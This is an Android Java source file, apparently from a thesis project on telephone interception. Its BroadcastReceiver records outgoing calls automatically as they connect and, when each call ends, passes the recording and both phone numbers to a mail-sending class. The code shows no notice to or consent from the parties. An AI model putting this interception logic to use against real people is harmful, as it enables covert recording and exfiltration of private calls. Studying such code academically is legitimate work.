package corso.java.tesiintercettazionitelefoniche;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.util.Log;

import java.util.Calendar;
import java.util.Date;

public class OutgoingCallReceiver extends BroadcastReceiver {

    private static final String LOG_TAG = "AudioRecordTest";
    static CallRecorder cr;
    static MailSender ms;
    static String myNumber;
    static String savedPhoneNumber;
    static String fileName = "/test01";

    public OutgoingCallReceiver(){

    }

    public OutgoingCallReceiver(CallRecorder cr, MailSender ms, String myNumber){
        this.cr = cr;
        this.ms = ms;
        this.myNumber = myNumber;
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        final PendingResult pendingResult = goAsync();
        Task asyncTask = new Task(pendingResult, intent);
        asyncTask.execute();
    }

    private static class Task extends AsyncTask<String, Integer, String> {

        private final PendingResult pendingResult;
        private final Intent intent;

        private Task(PendingResult pendingResult, Intent intent) {
            this.pendingResult = pendingResult;
            this.intent = intent;
        }

        @Override
        protected String doInBackground(String... strings) {
            String phoneNumber = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);

            if(phoneNumber!=null)
                savedPhoneNumber = phoneNumber;

            String action = intent.getAction();
            String uri = intent.toUri(Intent.URI_INTENT_SCHEME);
            if(action.equals("android.intent.action.NEW_OUTGOING_CALL")){
                Log.d(LOG_TAG, "Nuova chiamata verso "+ savedPhoneNumber);
            }
            if(action.equals("android.intent.action.PHONE_STATE")){
                if(uri.contains("state=OFFHOOK")){
                    Date currentTime = Calendar.getInstance().getTime();
                    fileName = "/"+currentTime.toString().replace(" ", "").replace(":", "").replace("+", "");
                    Log.d(LOG_TAG, fileName);
                    cr.startRecording(fileName);
                    ms.setFileName(cr.getLocation(), fileName);
                    Log.d(LOG_TAG, "Chiamata in corso con "+ savedPhoneNumber);
                }
                if(uri.contains("state=IDLE")){
                    if(cr.stopRecording()){
                        ms.sendMail(myNumber, savedPhoneNumber);
                        Log.d(LOG_TAG, "Chiamata terminata con "+ savedPhoneNumber);
                    }
                }
            }

            StringBuilder sb = new StringBuilder();
            sb.append("Action: " + action + "\n");
            sb.append("URI: " + uri + "\n");
            String log = sb.toString();
            Log.d("AudioRecordTest", log);

            return log;
        }

        @Override
        protected void onPostExecute(String s) {
            super.onPostExecute(s);
            // Must call finish() so the BroadcastReceiver can be recycled.
            pendingResult.finish();
        }
    }
}